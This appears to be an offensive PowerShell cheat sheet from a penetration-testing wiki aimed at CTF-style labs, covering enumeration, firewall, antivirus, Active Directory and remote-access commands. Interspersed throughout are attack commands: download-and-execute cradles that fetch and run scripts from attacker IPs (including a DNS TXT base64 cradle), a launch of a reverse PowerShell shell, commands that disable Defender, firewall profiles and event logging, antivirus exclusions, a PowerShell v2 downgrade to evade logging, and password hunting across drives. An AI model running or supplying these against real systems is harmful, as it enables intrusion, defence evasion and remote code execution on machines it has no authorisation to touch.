# Powershell (Offensive)

This page contains some useful commands for penetration testers. Note that most of these commands are only useful in CTF style environments as they would be logged and alerted on by any decent corporate blue team, especially if they are run in succession. In addition, only some of these commands will work when being run as a regular user, others will require administrator privileges.

{% hint style="info" %}
Note that not all the commands below work on all versions of Powershell.

Where possible I have included the version information.
{% endhint %}

## Helpful Commands

Get the commands for a specified module:

```
Get-Command -Module NetSecurity
```

Get available properties for objects returned by a command:

```
Get-Service | Get-Member -MemberType Property
```

List available modules:

```
Get-Module
Get-Module -ListAvailable
```

Check the execution policy for powershell scripts:

```
Get-ExecutionPolicy
Get-ExecutionPolicy -Scope CurrentUser
Get-ExecutionPolicy -List | Format-Table -AutoSize
```

Import a module:

```
Import-Module PowerSploit
Get-Command -Module PowerSploit
```

Get help for module or command:

```
Get-Command -Module PowerSploit
Get-Help Get-System -examples
```

## Command/Script Execution

Get the execution policy:

```
Get-ExecutionPolicy
Get-ExecutionPolicy -List | Format-Table -AutoSize
```

Set the execution policy:

```
Set-ExecutionPolicy Bypass -Scope CurrentUser
```

Bypass execution restriction only for a specific operation/command:

```
powershell.exe -ExecutionPolicy Bypass -File C:\file.ps1
powershell.exe -ExecutionPolicy Bypass "Get-ACL c:\users\administrator | Select -ExpandProperty AccessToString"
```

Bypass execution restriction by piping the content of a locally stored script into Powershell:

```
Get-Content c:\windows\temp\file.ps1 | powershell.exe -noprofile -
type c:\windows\temp\file.ps1 | powershell.exe -noprofile -
```

Bypass execution restriction by downloading and executing a script from memory:

```
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.x.x.x/file.ps1')"
```

Bypass execution restriction by using the "command" switch:

```
powershell -c "Get-ACL c:\users\administrator | Select -ExpandProperty AccessToString"
```

### Powershell Execution Policies

| Policy         | Description                                                                                                                                          |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| `AllSigned`    | Only scripts signed by a trusted publisher can be run.                                                                                               |
| `Bypass`       | No restrictions; all Windows PowerShell scripts can be run.                                                                                          |
| `Default`      | Normally `RemoteSigned`, but is controlled via ActiveDirectory                                                                                       |
| `RemoteSigned` | Downloaded scripts must be signed by a trusted publisher before they can be run.                                                                     |
| `Restricted`   | No scripts can be run. Windows PowerShell can be used only in interactive mode.                                                                      |
| `Undefined`    | NA                                                                                                                                                   |
| `Unrestricted` | Similar to `bypass,` however, _If you run an unsigned script that was downloaded from the Internet, you are prompted for permission before it runs._ |

## Information Gathering

Get the powershell version/s:

```
$PSVersionTable
```

Ge the Powershell module paths on the system:

```
$Env:PSModulePath
```

Get the OS Architecture:

> For \[IntPtr]::Size output:
>
> 4 = 32bit
>
> 8 = 64bit

```
$ENV:PROCESSOR_ARCHITECTURE
(Get-CimInstance Win32_operatingsystem).OSArchitecture
(Get-WmiObject Win32_OperatingSystem).OSArchitecture
[IntPtr]::Size
```

Get the dotnet version/s:

```
Get-ChildItem -recurse "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" | Get-ItemProperty | Where { $_ -match 'Version' }
```

Get the running processes:

```
Get-Process
```

Get the services:

```
Get-Service
```

Get only the 'Running' services:

```
Get-Service | Where-Object { $_.Status -match 'Running'}
Get-Service | Where-Object { $_.Status -like 'Running'}
```

Get the installed hotfixes:

```
Get-Hotfix
```

Get a list of interfaces:

```
Get-NetIPInterface
```

Get list of listening TCP ports:

```
Get-NetTcpConnection -State Listen
```

Check the Language Mode:

```
$ExecutionContext.SessionState.LanguageMode
```

## File Operations

Get the access list permissions of a directory or file:

```
Get-ACL c:\users\administrator | fl *
Get-ACL c:\users\administrator |  Select -ExpandProperty AccessToString
```

> fl = Format-List

Find specified strings in files:

```
Select-String -path c:\*.* -pattern password
Select-String –path c:\users\*.txt –pattern password
ls -r c:\users\*.txt -file | % {Select-String -path $_ -pattern password}
```

View a file:

```
Get-Content file.txt
```

## Windows Firewall

{% hint style="info" %}
&#x20;Get-NetFirewallRule is part of the NetSecurity built-in module which was released from Windows 8.1 and Server 2012 R2 and later. For previous versions of Windows, use the "netsh advfirewall firewall" command.
{% endhint %}

Get enabled firewall rules and only display selected parameters (does not contain port numbers):

```
Get-NetFirewallRule | Where {$_.Enabled -eq "True"} | Select DisplayName,Direction,Profile,Action,Description
```

Get enabled firewall rules (does not contain port numbers), only display selected parameters and output to a csv file:

```
Get-NetFirewallRule | Where {$_.Enabled -eq "True"} | Select DisplayName,Direction,Profile,Action,Description | Export-CSV fw.csv
```

Get the firewall rules, ports and addresses in a formatted table output:

```
Get-NetFirewallRule -Action Allow -Enabled True -Direction Inbound |
Format-Table -Property Name,
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},
@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,Profile,Direction,Action
```

Get the firewall rules and related ports and addresses, and output to a CSV file:

```
Get-NetFirewallRule -Name '*' | Where-Object {$_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound'} | Select-Object Name, DisplayName, DisplayGroup, Action, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Profile | Export-Csv -Path "C:\Users\Public\fw.csv" -NoTypeInfo -Delim "," | Import-Csv -Path "C:\Users\Public\fw.csv"
```

Get the firewall profiles and their status:

```
Get-NetFirewallProfile | Select-Object Name, Enabled
```

Disable specified firewall profile:

```
Set-NetFirewallProfile -Profile Public -Enabled False
```

Disable all firewall profiles:

```
Set-NetFirewallProfile -All -Enabled False
```

Set the default action for the specified profile to allow all inbound connections:

```
Set-NetFirewallProfile –Name Public –DefaultInboundAction Allow
```

Set the default action for all profiles to allow all inbound connections:

```
Set-NetFirewallProfile –All –DefaultInboundAction Allow
```

Get the profile settings for a firewall policy managed by a GPO:

```
Get-NetFirewallProfile -policystore activestore
```

Check if the firewall is disabled on any interface:

> If the output is the following then the firewall is enabled on the interface.
>
> DisabledInterfaceAliases : {Ethernet0}&#x20;

```
Get-NetFirewallProfile -All | fl DisabledInterfaceAliases
```

Disable firewall logging:

```
Set-NetFireWallProfile -All -LogBlocked False -LogAllowed False -LogIgnored False
```

Add rule to allow inbound connections on ports 80 and 443:

```
New-NetFirewallRule -DisplayName 'Do not delete - helpdesk' -Profile @('Domain', 'Private', 'Public') -Direction Inbound -Action Allow -Protocol TCP -LocalPort @('80', '443')
```

Add rule to allow the specified app:

```
New-NetFirewallRule -DisplayName 'Allow the cat' -Program "C:\Windows\Temp\ncat.exe" -Action Allow -Profile Any -Direction Outbound
```

Add rule to allow inbound connection on the specified port from the specified IP:

```
New-NetFirewallRule -DisplayName 'For helpdesk access' –RemoteAddress 10.10.14.27 -Direction Inbound -Protocol TCP –LocalPort 1337 -Action Allow
```

## Event Logging

Turn off PowerShell Event logging (requires an elevated shell):

```
$PSHOME\RegisterManifest.ps1 -Unregister
```

Turn it back on:

```
$PSHOME\RegisterManifest.ps1
```



## Anti-Virus

Get the installed Anti-virus products for older versions of Windows (requires Powershell 3.0 or higher):

```
Get-CimInstance -Namespace root/SecurityCenter -ClassName AntivirusProduct
```

Get the installed Anti-virus products for newer versions of Windows (requires Powershell 3.0 or higher):

```
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

Get list of commands for the "Defender" module:

```
Get-Command -Module Defender
```

Check if the "Defender" service is running:

```
Get-service Windefend
```

Get the current status of "Defender", virus definition date and version, last update date, and much more:

```
Get-MpComputerStatus
```

Get status of various "Defender" components:

```
Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated
```

Check which features are "Disabled":

```
Get-MpPreference | fl disable*
```

Disable Real Time Monitoring in "Defender":

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

Disable the IPS system:

```
Set-MpPreference -DisableIntrusionPreventionSystem $true
```

Disable "Defender" completely:

```
New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
```

Add exclusion paths to the anti-virus exclusion list:

```
Add-MpPreference -ExclusionPath C:\, D:\
```

Remove an exclusion path:

```
Remove-MpPreference -ExclusionPath C:\
```

Exclude a process from anti-virus scans:

```
Set-MpPreference -ExclusionProcess "powershell.exe"
```

## Credentials

Create a credential object:

```
$username = 'Administrator'
$password = ConvertTo-SecureString 'Password1' -AsPlainText -Force
$credentialsObject = New-Object System.Management.Automation.PSCredential($username, $password)
```

Run a command with the credentials object. In the example below, we are connecting to the attack machine to download and execute the "InvokePowershellTcp" script which will make a new reverse powershell connection as the "credentialsObject" user:

```
Start-Process -FilePath "powershell" -ArgumentList "IEX(New-Object Net.WebClient).DownloadString('http://10.x.x.x/Invoke-PowerShellTcp.ps1')" -Credential $credentialsObject
```

## Applocker

Get the "Effective" applocker policy:

```
Get-ApplockerPolicy -Effective | Select -ExpandProperty RuleCollections
```

Get the "Local" applocker policy:

```
Get-AppLockerPolicy -Local
```

Get the "Domain" applocker policy:

```
Get-AppLockerPolicy -Domain
```

## File Transfers

Download a file using "System.Net.WebClient" (DownloadFile method):

```
(New-Object System.Net.WebClient).DownloadFile('http://10.x.x.x/nc.exe','c:\windows\temp\nc.exe')   
```

Download a file using "System.Net.WebClient" (DownloadString method with IEX cmdlet):

```
IEX (New-Object System.Net.WebClient).DownloadString('http://10.x.x.x/file.ps1')
```

### SMB

Start the server on the attacker system:

```
smbserver.py SHARE . -smb2support -username smbuser -password S0m3Pa$$W0@!
```

On the target system, create a credentials object and map a drive to the attacker box:

```
$username = 'smbuser'
$password = ConvertTo-SecureString 'S0m3Pa$$W0@!' -AsPlainText -Force
$credentialsObject = New-Object System.Management.Automation.PSCredential($username, $password)
New-PSDrive -Name TMPSHARE -PSProvider FileSystem -Credential $cred -Root \\x.x.x.x\SHARE
cd TMPSHARE:
```

## Active Directory

Most of the commands below require the "ActiveDirectory" module to be installed.

To import the module:

```
Import-module ActiveDirectory
```

### Information Gathering

Gather domain information:

```
Get-ADDomain
Get-DomainSID
Get-ADDomainController
Get-ADDomainController -Identity <DomainName>
Get-ADTrust -Filter *
Get-ADTrust -Identity <DomainName>
Get-ADForest
Get-ADForest -Identity <ForestName>
(Get-ADForest).Domains
Get-ADUser -Identity Administrator -Properties *
Get-ADUser Administrator -Properties Memberof | Select -ExpandProperty memberOf
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A
Get-ADUser -Filter {MemberOf -RecursiveMatch "CN=Domain Admins,OU=Users,OU=lab,DC=contoso,dc=com"}
Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'
Get-ADComputer
Get-ADComputer -Filter *
Get-ADComputer -Filter 'Name -like "comp*"' -Properties IPv4Address | FT Name,DNSHostName,IPv4Address -A
Get-ADComputerServiceAccount
Get-ADGroup
Get-ADGroup -Identity Administrators
Get-ADGroup –LDAPFilter (member:1.2.840.113556.1.4.1941:=CN=Administrator,OU=Employees,OU=lab,DC=contoso,DC=com,)
Get-ADGroupMember
Get-ADGroupMember -Identity Administrators
Get-ADGroupMember -Identity Administrators -Recursive | ft name
Get-ADGroupMember -Identity Administrators | foreach { Get-ADUser $_ -Properties * }
Get-ADGroupMember -Recursive Administrators | ForEach {Get-ADUser -filter {samaccountname -eq $_.SamAccountName} -Properties displayName, company, title, department } | Format-Table displayName,company,department,title -AutoSize
Get-ADPrincipalGroupMembership -Identity Administrator
Get-ADPrincipalGroupMembership Administrator | where {$_ -like "*allow*"} | Sort-Object | select -ExpandProperty name

```

Get list of Service Principle Names for a specified domain:

> \-T = perform query on the speicified domain or forest (when -F is also used)
>
> \-Q = query for existence of SPN

```
SetSPN -T domain.name -Q */*
```

Get the specified account SID:

```
Get-AdUser -Identity Administrator | Select Name, SID, UserPrincipalName
```

### Groups

Get the folders that an AD group has access to and export the results to CSV:

```
Get-ChildItem \\server\uncpathgoeshere -recurse | ForEach-Object {Get-Acl $_.FullName} | select pspath, psparentpath, pschildname, path, owner, group, AccessToString | Export-CSV C:\folder_perms.csv
```

## Export to CSV

Export the results of any PowerShell command to a CSV file by appending the following to a command:

```
| Export-Csv -NoTypeInformation .\filename.csv -Encoding UTF8
```

## Run command as another user

If you need to run a command as another user within PowerShell, this is one way to do it:

```
$username = 'user1'
$password = ConvertTo-SecureString -AsPlainText 'sillypassword' -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
Invoke-Command -ComputerName "computer1" -Credential $cred -ScriptBlock {whoami} 
```

## Remote Connectivity

This section will cover the various methods to connect remotely to a target system via PowerShell on a Windows attack machine.

### PSSession

By default, PSSession will connect to the target system using WSMan/WinRM over HTTP on TCP port 5985. To connect to a remote computer, the remote computer must be listening on the port that the connection uses.

```
Enter-PSSession -ComputerName Server01 -Credential Domain01\User01
Enter-PSSession -ComputerName Server01 -Port 90 -Credential Domain01\User01
```

Connect to a remote system using PSSession and SSH. To connect to a remote computer, the remote computer must be configured with the SSH service (SSHD) and must be listening on the port that the connection uses. The default port for SSH is 22.

```
Enter-PSSession -HostName UserA@LinuxServer01
PS> Enter-PSSession -HostName UserA@LinuxServer02:22 -KeyFilePath c:\<path>\userAKey_rsa
```

### WinRM over SSL

This requires a lot of setup to be done on the target system, which will not be covered here. For a detailed writeup of how to set this up check out the following article:

{% embed url="https://adamtheautomator.com/winrm-ssl" %}

Prerequisites:

* A target system that has WinRM over SSL enabled on TCP port 5986
* An exported user client authentication certificate file (.pfx)

On the Windows attack machine, connect to the target as follows:

* Create a password object
* Import the PFX client auth certificate
* Get the thumbprint
* Connect to the target

```
$password = ConvertTo-SecureString 'sillypassword' -AsPlainText -Force
Import-pfxCertificate -FilePath .\usercert.pfx -CertStoreLocation Cert:\CurrentUser\My -Password $password
Get-ChildItem Cert:\CurrentUser\My
Enter-PSSession -ComputerName comp1.contoso.com -CertificateThumbprint <thumbprint>
```

## Powershell v2

Windows PowerShell 2.0 (deprecated in August, 2017) is missing a significant amount of the hardening and security features added in versions 3, 4, and 5.

Run a lower version of PowerShell to potentially evade logging and other restrictions. From the run popup window or from the cli:

```
powershell -version 2
```

Connect to a remote machine via PowerShell 2.0. On the target system (Server01), in an elevated shell, create a session configuration as follows:

```
Register-PSSessionConfiguration -Name PS2 -PSVersion 2.0
```

On the attacker system:

```
New-PSSession -ComputerName Server01 -ConfigurationName PS2
```

View PowerShell log entries within PowerShell:

```
Get-EventLog 'Windows PowerShell' -EntryType Information -InstanceId 800
```

## PowerShell Event Logging Comparison

![](../.gitbook/assets/powershell\_event\_logging.JPG)

## Powershell Download Cradles

There are multiple ways to download files using PowerShell, including the following:

#### System.Net.WebClient:

```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```

#### Invoke-WebRequest:

```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```

#### Hidden IE com object:

```powershell
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://10.10.14.2/code.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
```

#### Msxml2.XMLHTTP COM object:

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.2/code.ps1',$false);$h.send();iex $h.responseText
```

#### WinHttp COM object (not proxy aware):

```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.14.2/code.ps1',$false);$h.send();iex $h.responseText
```

#### DNS download cradle:

```powershell
$m=(-join (resolve-dnsname -type txt txt.domain.here).strings); iex (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m))))
$z='';$n=1..2;ForEach ($i in $n) { $z += ((resolve-dnsname -type txt $icrapdomain.org).strings) }; iex((System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($z))))
```













